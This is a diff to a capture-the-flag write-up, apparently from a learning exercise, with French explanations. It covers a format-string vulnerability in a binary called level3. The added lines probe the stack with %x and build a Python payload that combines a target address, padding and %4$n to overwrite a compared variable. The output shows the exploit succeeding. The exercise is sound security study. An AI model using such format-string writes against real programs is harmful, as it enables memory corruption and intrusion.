@@ -54,10 +54,21 @@ Dump of assembler code for function v:
    0x08048518 <+116>:   leave  
    0x08048519 <+117>:   ret    
 
+> ./level3
+AAAAAAAAAAA %x %x %x %x
+AAAAAAAAAAA 200 b7fd1ac0 b7ff37d0 41414141 41414141
 
-> python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/printf
+Ici on utilise '%x' pour lire la data dans la stack.
+On voit donc que ce qui est envoyé dans le fgets est stocké à la 4ème position dans la stack. (A = 0x41)
 
-> cat /tmp/printf - | ./level3
+> python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit
+
+On envoie donc d'abord l'adresse de la variable local qui est comparée.
+Puis padding de A (60 car on veut 64 et l'adresse prends deja 4 octets).
+"%4$n" permet d'écrire le nombre d'octets envoyé dans le '4ème' emplacement de la stack qui est donc l'adresse de la variable local
+donnée juste avant.
+
+> cat /tmp/exploit - | ./level3
 �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Wait what?!
 
